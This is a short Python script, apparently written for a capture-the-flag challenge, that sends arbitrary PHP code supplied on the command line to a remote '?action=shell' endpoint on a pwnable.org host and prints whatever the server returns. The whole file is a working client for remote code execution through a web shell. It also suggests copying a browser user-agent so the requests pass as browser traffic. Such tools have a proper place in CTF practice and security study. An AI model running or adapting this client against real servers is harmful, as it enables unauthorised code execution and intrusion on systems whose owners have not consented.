#!/usr/bin/env python3

import requests
import sys
import urllib

"""
Upload me with:
./deploy.py
"""


if len(sys.argv) < 2:
    print("Usage:   {} PHP_CODE".format(sys.argv[0]))
    print("Example: {} 'var_dump(get_defined_functions());'".format(sys.argv[0]))
    exit()

cmd = "error_reporting(E_ALL);" + sys.argv[1]
cmd = urllib.parse.quote_plus(cmd)

headers = {
    # Note: put your browser user-agent here to have the same behaviour here and in browser
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
}


url = 'http://pwnable.org:47780/?action=shell&0=' + cmd

r = requests.get(url, headers=headers)
print(r.text)
